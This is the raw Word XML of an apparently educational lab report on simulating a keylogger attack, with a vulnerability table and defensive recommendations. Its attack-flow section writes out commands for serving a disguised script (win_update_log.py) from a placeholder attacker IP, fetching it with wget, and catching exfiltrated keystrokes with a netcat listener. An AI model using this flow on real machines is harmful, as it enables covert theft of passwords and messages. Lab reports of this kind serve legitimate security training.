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FBCC4" w14:textId="77777777" w:rsidR="00017F81" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Title"/>
      </w:pPr>
      <w:r>
        <w:t>🛡️ Vulnerability Test Report: Keylogger Simulation in a Controlled Lab Environment</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7969608D" w14:textId="6E257998" w:rsidR="00017F81" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Date: 2025-05-19</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AA9E7A6" w14:textId="78AD31B5" w:rsidR="00017F81" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Author: Melvin Kwame Awuku</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4328B0D5" w14:textId="5FD8EC1B" w:rsidR="00017F81" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Purpose: Educational and Ethical Hacking Research Only</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B14B9F1" w14:textId="77777777" w:rsidR="00017F81" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>1. 📋 Objective</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="352E0EDE" w14:textId="77777777" w:rsidR="00017F81" w:rsidRDefault="00000000">
      <w:r>
        <w:t>This test simulates a real-world keylogging attack scenario in a controlled lab environment. The goal was to understand how keystrokes can be intercepted using a Python-based keylogger and how such activities can be analyzed with tools like Wireshark. The test also demonstrates data exfiltration via socket communication and Netcat listeners.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42FD3CF4" w14:textId="77777777" w:rsidR="00017F81" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>2. 🖥️ Lab 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17F81" w14:paraId="09D750F5" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="08184279" w14:textId="77777777" w:rsidR="00017F81" w:rsidRDefault="00000000">
            <w:r>
              <w:t>Component</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="25BAC9AA" w14:textId="77777777" w:rsidR="00017F81" w:rsidRDefault="00000000">
            <w:r>
              <w:t>Configuration</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00017F81" w14:paraId="264C89E8" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="24498472" w14:textId="77777777" w:rsidR="00017F81" w:rsidRDefault="00000000">
            <w:r>
              <w:t>Attacker Machine</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="336AE128" w14:textId="77777777" w:rsidR="00017F81" w:rsidRDefault="00000000">
            <w:r>
              <w:t>Kali Linux 2023.3 (Virtual Machine)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00017F81" w14:paraId="030F6F70" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="615362F8" w14:textId="77777777" w:rsidR="00017F81" w:rsidRDefault="00000000">
            <w:r>
              <w:t>Victim Machine</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5708AE31" w14:textId="77777777" w:rsidR="00017F81" w:rsidRDefault="00000000">
            <w:r>
              <w:t>Windows 11 Pro (Build x64)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00017F81" w14:paraId="619F0DE3" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0232C2CE" w14:textId="77777777" w:rsidR="00017F81" w:rsidRDefault="00000000">
            <w:r>
              <w:t>Network Type</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="70680545" w14:textId="77777777" w:rsidR="00017F81" w:rsidRDefault="00000000">
            <w:r>
              <w:t>Host-only Adapter</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2DE4B055" w14:textId="77777777" w:rsidR="00017F81" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>3. ⚙️ Tools &amp; Technologies Used</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="394D71D0" w14:textId="77777777" w:rsidR="00017F81" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Python 3: Core programming language</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B141698" w14:textId="77777777" w:rsidR="00017F81" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>pynput: Captures keyboard inputs on the victim system</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CB3C3D8" w14:textId="77777777" w:rsidR="00017F81" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>socket (Python stdlib): Sends data via TCP</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="176D34C6" w14:textId="77777777" w:rsidR="00017F81" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Netcat (nc): Listens for incoming keystrokes on attacker machine</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="538E5AC8" w14:textId="77777777" w:rsidR="00017F81" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Wireshark: Analyzes packet data on the network</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="173D961B" w14:textId="77777777" w:rsidR="00017F81" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>wget: Used on the victim to retrieve the malicious script from attacker’s web server</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30B44F6B" w14:textId="77777777" w:rsidR="00017F81" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Python HTTP Server: Serves the keylogger to the victim</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10578BE6" w14:textId="77777777" w:rsidR="00017F81" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>4. 🔗 Attack Flow Summary</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="099EA9BC" w14:textId="77777777" w:rsidR="00017F81" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>The attacker created a Python-based keylogger using the `pynput` library.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26E24719" w14:textId="6FF822B1" w:rsidR="00017F81" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>The script was hosted on the attacker machine using:</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>python3 -m http.server 80</w:t>
      </w:r>
      <w:r w:rsidR="004C67AF">
        <w:t>80</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51CE4D97" w14:textId="3719F722" w:rsidR="00017F81" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>The victim machine downloaded the script using `wget`:</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>wget http://&lt;attacker_ip&gt;:80</w:t>
      </w:r>
      <w:r w:rsidR="004C67AF">
        <w:t>80</w:t>
      </w:r>
      <w:r>
        <w:t>/</w:t>
      </w:r>
      <w:r w:rsidR="000705E9">
        <w:t>win_update_log.py</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> -OutFile </w:t>
      </w:r>
      <w:r w:rsidR="000705E9">
        <w:t>win_update_log.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72838CF1" w14:textId="16CC7DF1" w:rsidR="00017F81" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The attacker started a listener </w:t>
      </w:r>
      <w:r w:rsidR="004C67AF">
        <w:t xml:space="preserve">and saved the file to log.txt </w:t>
      </w:r>
      <w:r>
        <w:t>on Kali using:</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>nc -lvnp 4444</w:t>
      </w:r>
      <w:r w:rsidR="004C67AF">
        <w:t xml:space="preserve"> &gt; log.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BC2F9C1" w14:textId="77777777" w:rsidR="00017F81" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>The victim executed the keylogger script:</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>python keylogger.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41F432DC" w14:textId="77777777" w:rsidR="00017F81" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>As the victim typed, keystrokes were transmitted over TCP to the attacker’s terminal.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50500247" w14:textId="77777777" w:rsidR="00017F81" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Wireshark was used on Kali to capture and analyze this traffic using the filter:</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>tcp.port == 4444</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28744E43" w14:textId="77777777" w:rsidR="00017F81" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>5. 🔍 Observed Vulnerabilities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017F81" w14:paraId="3E04C5B6" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1728" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="10EB2C78" w14:textId="77777777" w:rsidR="00017F81" w:rsidRDefault="00000000">
            <w:r>
              <w:t>ID</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1728" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2915C00D" w14:textId="77777777" w:rsidR="00017F81" w:rsidRDefault="00000000">
            <w:r>
              <w:t>Vulnerability</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1728" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="42757F00" w14:textId="77777777" w:rsidR="00017F81" w:rsidRDefault="00000000">
            <w:r>
              <w:t>Affected Component</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1728" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="3095F965" w14:textId="77777777" w:rsidR="00017F81" w:rsidRDefault="00000000">
            <w:r>
              <w:t>Impact Level</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1728" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="048D5BBB" w14:textId="77777777" w:rsidR="00017F81" w:rsidRDefault="00000000">
            <w:r>
              <w:t>Description</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00017F81" w14:paraId="18C4C4D0" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1728" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5821BA79" w14:textId="77777777" w:rsidR="00017F81" w:rsidRDefault="00000000">
            <w:r>
              <w:t>VULN-001</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1728" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="20FB8841" w14:textId="77777777" w:rsidR="00017F81" w:rsidRDefault="00000000">
            <w:r>
              <w:t>Insecure Script Download (Cleartext)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1728" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6CA6E659" w14:textId="77777777" w:rsidR="00017F81" w:rsidRDefault="00000000">
            <w:r>
              <w:t>Victim Machine (wget)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1728" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="59DFE223" w14:textId="77777777" w:rsidR="00017F81" w:rsidRDefault="00000000">
            <w:r>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1728" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="7CF331A7" w14:textId="77777777" w:rsidR="00017F81" w:rsidRDefault="00000000">
            <w:r>
              <w:t>The keylogger script was downloaded via HTTP, which is unencrypted and susceptible to interception or modification.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00017F81" w14:paraId="25D6D98E" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1728" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4FBF1DD4" w14:textId="77777777" w:rsidR="00017F81" w:rsidRDefault="00000000">
            <w:r>
              <w:t>VULN-002</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1728" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="71E825AE" w14:textId="77777777" w:rsidR="00017F81" w:rsidRDefault="00000000">
            <w:r>
              <w:t>Remote Code Execution (RCE) via Script</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1728" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="71FA71FA" w14:textId="77777777" w:rsidR="00017F81" w:rsidRDefault="00000000">
            <w:r>
              <w:t>Victim Machine</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1728" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2FF38812" w14:textId="77777777" w:rsidR="00017F81" w:rsidRDefault="00000000">
            <w:r>
              <w:t>High</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1728" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2CB7E4F2" w14:textId="77777777" w:rsidR="00017F81" w:rsidRDefault="00000000">
            <w:r>
              <w:t>The victim executed a remote script without validation, allowing attacker-controlled code to run.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00017F81" w14:paraId="1C540235" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1728" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="3E64D48F" w14:textId="77777777" w:rsidR="00017F81" w:rsidRDefault="00000000">
            <w:r>
              <w:t>VULN-003</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1728" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="3D3B3FBA" w14:textId="77777777" w:rsidR="00017F81" w:rsidRDefault="00000000">
            <w:r>
              <w:t>Lack of Firewall or Intrusion Detection</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1728" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="25088AE1" w14:textId="77777777" w:rsidR="00017F81" w:rsidRDefault="00000000">
            <w:r>
              <w:t>Victim Network</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1728" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="53C49814" w14:textId="77777777" w:rsidR="00017F81" w:rsidRDefault="00000000">
            <w:r>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1728" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="380B15E7" w14:textId="77777777" w:rsidR="00017F81" w:rsidRDefault="00000000">
            <w:r>
              <w:t>The victim machine allowed outbound traffic to the attacker's listening port without alerts or blocking.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00017F81" w14:paraId="018B24C7" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1728" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5DE56313" w14:textId="77777777" w:rsidR="00017F81" w:rsidRDefault="00000000">
            <w:r>
              <w:t>VULN-004</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1728" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4416B61B" w14:textId="77777777" w:rsidR="00017F81" w:rsidRDefault="00000000">
            <w:r>
              <w:t>Plaintext Data Exfiltration Over Network</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1728" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="3654FA5C" w14:textId="77777777" w:rsidR="00017F81" w:rsidRDefault="00000000">
            <w:r>
              <w:t>Network (TCP Port 4444)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1728" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="75155903" w14:textId="77777777" w:rsidR="00017F81" w:rsidRDefault="00000000">
            <w:r>
              <w:t>High</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1728" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4F04ADC4" w14:textId="77777777" w:rsidR="00017F81" w:rsidRDefault="00000000">
            <w:r>
              <w:t xml:space="preserve">Keystrokes were sent in cleartext, making them visible to anyone with access to the network (as </w:t>
            </w:r>
            <w:r>
              <w:lastRenderedPageBreak/>
              <w:t>shown in Wireshark).</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="520EA156" w14:textId="77777777" w:rsidR="00017F81" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>6. 🎯 Evidence of Exploitation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16503F2E" w14:textId="77777777" w:rsidR="00017F81" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Wireshark PCAPs: Captured sessions showing cleartext keystrokes (e.g., typed passwords or messages).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F948BF9" w14:textId="77777777" w:rsidR="00017F81" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Netcat Output: Real-time display of the victim’s keyboard inputs in the attacker’s terminal.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20CA9524" w14:textId="77777777" w:rsidR="00017F81" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Terminal Logs: Logs from `wget` and Netcat listener validating script delivery and keystroke reception.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16C85D13" w14:textId="77777777" w:rsidR="00017F81" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>7. 🛠️ Recommendations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17F81" w14:paraId="6863CB7C" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1FA750F6" w14:textId="77777777" w:rsidR="00017F81" w:rsidRDefault="00000000">
            <w:r>
              <w:t>Recommendation</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="70D9A38A" w14:textId="77777777" w:rsidR="00017F81" w:rsidRDefault="00000000">
            <w:r>
              <w:t>Priority</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00017F81" w14:paraId="63E2A41B" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="578232AE" w14:textId="77777777" w:rsidR="00017F81" w:rsidRDefault="00000000">
            <w:r>
              <w:t>Use HTTPS and signed scripts for all downloads</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="38DF26DC" w14:textId="77777777" w:rsidR="00017F81" w:rsidRDefault="00000000">
            <w:r>
              <w:t>High</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00017F81" w14:paraId="676DDE2B" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="08BE8604" w14:textId="77777777" w:rsidR="00017F81" w:rsidRDefault="00000000">
            <w:r>
              <w:t>Implement Endpoint Detection &amp; Response (EDR)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1027F1A4" w14:textId="77777777" w:rsidR="00017F81" w:rsidRDefault="00000000">
            <w:r>
              <w:t>High</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00017F81" w14:paraId="55C59B3F" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="7CF0FD4C" w14:textId="77777777" w:rsidR="00017F81" w:rsidRDefault="00000000">
            <w:r>
              <w:t>Restrict unknown outbound traffic via firewall</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4432391B" w14:textId="77777777" w:rsidR="00017F81" w:rsidRDefault="00000000">
            <w:r>
              <w:t>High</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00017F81" w14:paraId="3D0F7277" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="18E1A2F2" w14:textId="77777777" w:rsidR="00017F81" w:rsidRDefault="00000000">
            <w:r>
              <w:t>Educate users on risks of running unknown scripts</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2334D656" w14:textId="77777777" w:rsidR="00017F81" w:rsidRDefault="00000000">
            <w:r>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00017F81" w14:paraId="12AA03B2" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="14A7152D" w14:textId="77777777" w:rsidR="00017F81" w:rsidRDefault="00000000">
            <w:r>
              <w:t>Log and alert all outgoing TCP connections to uncommon ports</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="68E41FEF" w14:textId="77777777" w:rsidR="00017F81" w:rsidRDefault="00000000">
            <w:r>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1F5C7E69" w14:textId="77777777" w:rsidR="00017F81" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>8. 🚨 Disclaimer</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A6A4535" w14:textId="77777777" w:rsidR="00017F81" w:rsidRDefault="00000000">
      <w:r>
        <w:t>This activity was conducted strictly within a controlled lab environment for educational and ethical hacking research purposes. The techniques demonstrated are not intended for malicious use. Unauthorized deployment of keyloggers or similar surveillance tools may constitute a violation of local, national, or international laws.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4832A9E1" w14:textId="7C9BFA9D" w:rsidR="00017F81" w:rsidRDefault="00000000" w:rsidP="000705E9">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">9. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
        </w:rPr>
        <w:t>📎</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Attachments</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AAC0B42" w14:textId="77777777" w:rsidR="00017F81" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Screenshots of terminal and Wireshark captures</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68909DC5" w14:textId="77777777" w:rsidR="000705E9" w:rsidRDefault="000705E9" w:rsidP="000705E9">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="44DB4645" w14:textId="77777777" w:rsidR="000705E9" w:rsidRDefault="000705E9" w:rsidP="000705E9">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="12A7C408" w14:textId="3D628BA5" w:rsidR="000705E9" w:rsidRDefault="000705E9" w:rsidP="000705E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0894055F" wp14:editId="0F4F84EF">
            <wp:extent cx="5486400" cy="2943860"/>
            <wp:effectExtent l="0" t="0" r="0" b="8890"/>
            <wp:docPr id="143928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83446" name="Picture 14392834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0221" w14:textId="77777777" w:rsidR="000705E9" w:rsidRDefault="000705E9" w:rsidP="000705E9">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
        <w:jc w:val="center"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="799C6622" w14:textId="0238EDFC" w:rsidR="000705E9" w:rsidRDefault="000705E9" w:rsidP="000705E9">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t>Image_1.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15220C0D" w14:textId="77777777" w:rsidR="000705E9" w:rsidRDefault="000705E9" w:rsidP="000705E9">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
        <w:jc w:val="center"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4D768F9C" w14:textId="77777777" w:rsidR="000705E9" w:rsidRDefault="000705E9" w:rsidP="000705E9">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
        <w:jc w:val="center"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="621611B1" w14:textId="5FED9DBC" w:rsidR="000705E9" w:rsidRDefault="000705E9" w:rsidP="000705E9">
